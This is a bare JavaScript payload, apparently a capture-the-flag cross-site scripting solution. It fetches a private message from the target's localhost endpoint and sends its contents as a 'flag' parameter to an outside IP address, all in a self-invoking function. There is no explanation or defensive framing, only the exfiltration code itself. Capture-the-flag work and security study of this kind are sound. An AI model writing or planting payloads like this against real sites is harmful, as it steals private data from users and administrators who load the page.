const loadLetter = () => {

  fetch('http://127.0.0.1/message/3')
    .then(response => response.json())
    .then(data => {
      fetch('http://178.62.102.205:80?flag=' + data.message);
});
};
loadLetter();
